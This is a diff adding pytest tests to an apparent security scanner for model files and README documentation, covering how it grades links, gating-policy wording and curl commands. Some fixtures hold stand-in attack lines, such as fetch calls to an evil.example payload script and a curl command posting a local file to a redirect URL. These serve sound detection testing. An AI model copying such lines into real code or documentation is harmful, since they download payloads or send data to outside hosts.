@@ -1791,6 +1791,44 @@ def test_text_scanner_model_card_capitalized_bullet_label_markdown_links_stay_in
     _assert_model_card_endpoint_informational(tmp_path, content)
 
 
+def test_inline_html_citations_after_a_sentence_are_informational(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        'Results match prior evaluations. (see <a href="https://tracker.example.org/a">1</a>\n'
+        '<a href="https://tracker.example.org/b">2</a> <a href="https://tracker.example.org/c">3</a>)\n'
+    )
+    result = _scan_text_content(path, content)
+    urls = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert len(urls) == 3 and all(check.severity == IssueSeverity.INFO for check in urls)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+def test_documented_issue_label_does_not_open_a_call_around_later_link(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    content = (
+        "> Supported in [runtime](https://tracker.example.org/runtime) and newer "
+        "([#12](https://tracker.example.org/issues/12)).\n\n"
+        "Example usage with [runtime](https://tracker.example.org/guide):\n"
+    )
+    path.write_bytes(content.encode())
+    scan = scan_model_directory_or_file(str(path), cache_enabled=False)
+    guide_position = path.read_bytes().index(b"https://tracker.example.org/guide")
+    guide = [issue for issue in scan.issues if issue.details and issue.details.get("position") == guide_position]
+    assert guide and all(issue.severity == IssueSeverity.INFO for issue in guide)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        """client.fetch('see <a href="https://evil.example/payload.sh">download</a>')""",
+        "client.fetch(  # [#12](https://tracker.example.org/issues/12))\n"
+        "    '[download](https://evil.example/payload.sh)'\n)",
+    ],
+)
+def test_html_and_issue_citations_preserve_actual_enclosing_calls(tmp_path: Path, content: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(tmp_path, content)
+
+
 def test_text_scanner_markdown_link_context_prefix_remains_bounded() -> None:
     payload = b"intro\n" + (b"a" * (MAX_TEXT_FINDING_CONTEXT_BYTES * 4)) + b"\n[API docs](https://docs.example.com)\n"
     position = payload.index(b"https://")
@@ -4268,6 +4306,208 @@ def test_text_scanner_classifier_and_process_prose_preserves_actionable_occurren
     tmp_path: Path, content: str
 ) -> None:
     _assert_documentation_network_actionable(tmp_path, content, "cc_pattern")
+
+
+@pytest.mark.parametrize(
+    "card",
+    [
+        "---\nextra_gated_prompt: >-\n"
+        "  #### Prohibited Uses\n\n"
+        "  You agree you will not use, or allow others to use, the package to:\n"
+        "    1. Violate the following restrictions:\n"
+        "       2. Create, generate, or facilitate the creation of malicious code, malware, or computer viruses.\n"
+        "---\n",
+        r"""---
+extra_gated_prompt: "Usage agreement for the \"Package\".\n\
+  #### Prohibited Uses\nYou agree you will not use, or allow others to use, the package to:\n\
+  1. Violate the following restrictions:\n    2. Create, generate, or facilitate the creation\
+  \ of malicious code, malware, or computer viruses."
+---
+""",
+        "---\nextra_gated_prompt: |\n  ## Prohibited Uses\n  1. Do not generate malware.\n---\n",
+    ],
+    ids=["folded", "double-quoted", "direct-prohibition"],
+)
+def test_gating_policy_prohibition_keeps_malware_literal_informational(tmp_path: Path, card: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(card.encode())
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("pattern") == "malware"
+        and check.details.get("position") == card.encode().index(b"malware")
+        and check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "### Prohibited Uses\n1. Create, generate, or facilitate the creation of malicious code, malware, or viruses.",
+        "---\nextra_gated_prompt: >-\n  #### Prohibited Uses\n"
+        "  You agree you will not use, or allow others to use, this model to:\n"
+        "    1. Create, generate, or facilitate the creation of malicious code, malware, or viruses.\n"
+        "---\nThis model installs malware during initialization.\n",
+    ],
+)
+def test_gating_policy_prohibition_requires_context_and_preserves_active_claim(tmp_path: Path, content: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(content.encode())
+    assert any(
+        check.details.get("pattern") == "malware"
+        and check.details.get("position") == content.encode().rindex(b"malware")
+        and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+def _escaped_gating_policy(terms: str) -> str:
+    continuation = "  The license applies to this project.\\\n"
+    repeats = MAX_TEXT_FINDING_CONTEXT_BYTES // len(continuation) + 1
+    return '---\nextra_gated_prompt: "Terms\\\n' + continuation * repeats + terms + '"\n---\n'
+
+
+@pytest.mark.parametrize(
+    "policy_reference",
+    [
+        "The most recent copy of this policy can be found at [https://publisher.dev/terms](https://publisher.dev/terms).",
+        "See the current policy at [usage policy](https://publisher.dev/terms).",
+    ],
+)
+def test_gating_policy_links_and_reporting_address_are_passive_references(
+    tmp_path: Path, policy_reference: str
+) -> None:
+    visible = "https://github.com/example/package/issues"
+    wrapper = "https://l.workplace.com/l.php?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues&h=abcdef1234"
+    content = _escaped_gating_policy(
+        "  You will comply with the distributor's brand guidelines (currently accessible at\\\n"
+        r"  \ https://publisher.dev/guide).\n"
+        f"{policy_reference}\\n\\\n"
+        f"  * Reporting issues with the model: [{visible}]({wrapper})\\n\\\n"
+        "  * Reporting violations of the Acceptable Use Policy or unlicensed uses of the\\\n"
+        r"  \ package: editor@supportdesk.ai"
+    )
+    path = tmp_path / "README.md"
+    path.write_bytes(content.encode())
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    evidence = {check.details.get("normalized_evidence", {}).get("value") for check in checks}
+    assert {"https://publisher.dev/guide", "https://publisher.dev/terms", visible} <= evidence
+    assert any(check.details.get("url", "").startswith("https://l.workplace.com/l.php") for check in checks)
+    assert any(check.details.get("domain") == "supportdesk.ai" for check in checks)
+    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+    command = f"~~~sh\ncurl -L '{wrapper}' -d @input.txt\n~~~\n"
+    payload = (content + command).encode()
+    path.write_bytes(payload)
+    assert any(
+        check.details.get("position") == payload.rindex(wrapper.encode())
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+def test_gating_policy_reports_multiline_feedback_and_security_references(tmp_path: Path) -> None:
+    content = (
+        b"---\nextra_gated_prompt: >-\n  See the project.cpp(#239) release.\n"
+        b"  * Reporting risky content generated by the model:\n    feedback.publisher.dev/model_feedback\n"
+        b"  * Reporting bugs and security concerns: [security.publisher.dev/report]"
+        b"(https://security.publisher.dev/report)\n"
+        b"---\n"
+    )
+    path = tmp_path / "README.md"
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(check.details.get("domain") == "feedback.publisher.dev" for check in checks)
+    assert any(check.details.get("url", "").startswith("https://security.publisher.dev/report") for check in checks)
+    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    content += b"~~~sh\ncurl feedback.publisher.dev\n~~~\n"
+    path.write_bytes(content)
+    assert any(
+        check.details.get("domain") == "feedback.publisher.dev"
+        and check.details.get("position") == content.rindex(b"feedback.publisher.dev")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+@pytest.mark.parametrize(
+    ("label", "wrapper", "evidence"),
+    [
+        (
+            "https://github.com/example/package/issues",
+            "https://relay.dev/r?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues",
+            "https://relay.dev/r",
+        ),
+        (
+            "https://github.com/example/package/issues",
+            "https://l.workplace.com/l.php?u=https%3A%2F%2Fcallback.dev%2Fcollect&h=abc123",
+            "https://l.workplace.com/l.php",
+        ),
+        (
+            "https://github.com/example/package/issues",
+            "https://l.workplace.com/l.php?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues&next=custom",
+            "https://l.workplace.com/l.php",
+        ),
+        ("security.publisher.dev/report", "https://callback.dev/collect", "security.publisher.dev"),
+    ],
+    ids=["unknown-wrapper", "mismatched-destination", "extra-parameter", "mismatched-visible-host"],
+)
+def test_gating_policy_preserves_unverified_reporting_destinations(
+    tmp_path: Path, label: str, wrapper: str, evidence: str
+) -> None:
+    content = _escaped_gating_policy(f"  * Reporting issues with the model: [{label}]({wrapper})")
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("normalized_evidence", {}).get("value") == evidence
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+@pytest.mark.parametrize(
+    ("credit", "reference"),
+    [
+        ("Quantized and validated by **Sample Team** — maintainer@publisher.dev", "publisher.dev"),
+        ("Converted by **Sample Team** — maintainer@publisher.dev", "publisher.dev"),
+        (
+            "AWQ quantization: done by lab in INT4 GEMM with Toolkit by dev-team (https://github.com/dev-team/toolkit/)",
+            "https://github.com/dev-team/toolkit/",
+        ),
+    ],
+)
+def test_model_card_byline_preserves_documented_post_and_later_shell_destination(
+    tmp_path: Path, credit: str, reference: str
+) -> None:
+    content = (
+        "~~~bash\ncurl http://127.0.0.1:8080/v1/chat -d '{}'\n~~~\n\n"
+        "Use package.cpp(#935) before continuing.\n\n"
+        f"{credit}\n"
+    ).encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("position") == content.index(reference.encode())
+        and check.details.get("type") in {"url_detected", "domain_name"}
+        and check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    assert any(
+        check.details.get("position") == content.index(b"http://127.0.0.1")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in checks
+    )
+    content += f"\n~~~sh\ncurl {reference}\n~~~\n".encode()
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("type") in {"url_detected", "domain_name"}
+        and check.details.get("position") == content.rindex(reference.encode())
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in checks
+    )
 
 
 def test_text_scanner_documentation_possible_misuse_is_informational(tmp_path: Path) -> None:
@@ -6776,6 +7016,34 @@ def test_http_request_reports_its_evidence_source(tmp_path: Path, filename: str)
     else:
         assert "evidence_source" not in url_check.details
         assert url_check.why == "Models should not contain network communication capabilities"
+
+
+@pytest.mark.parametrize(
+    ("source", "url"),
+    [
+        (b"~~~sh\ncurl -X POST http://127.0.0.1:8080/embed -d @inputs.json\n~~~\n", "http://127.0.0.1:8080/embed"),
+        (
+            b"~~~python\nfrom openai import OpenAI\n"
+            b'client = OpenAI(base_url="http://localhost:8080/v1", api_key="demo")\n'
+            b'client.chat.completions.create(model="sample", messages=[])\n~~~\n',
+            "http://localhost:8080/v1",
+        ),
+    ],
+)
+def test_documented_request_report_attributes_the_url_to_its_source(tmp_path: Path, source: bytes, url: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(source)
+    result = scan_model_directory_or_file(str(path), cache_enabled=False)
+    issue = next(issue for issue in result.issues if issue.details.get("url") == url)
+    assert determine_exit_code(result) == 1
+    assert issue.severity == IssueSeverity.CRITICAL
+    assert issue.details["evidence_source"] == "documentation"
+    assert issue.details["position"] == source.index(url.encode())
+    assert issue.message == f"URL detected in documentation: {url}"
+    assert issue.why == (
+        "This indicator appears in documentation. Any network access depends on how the documented "
+        "code, configuration, or tools are used."
+    )
 
 
 def test_truncated_document_keeps_fully_inspected_local_client_informational(tmp_path: Path) -> None:
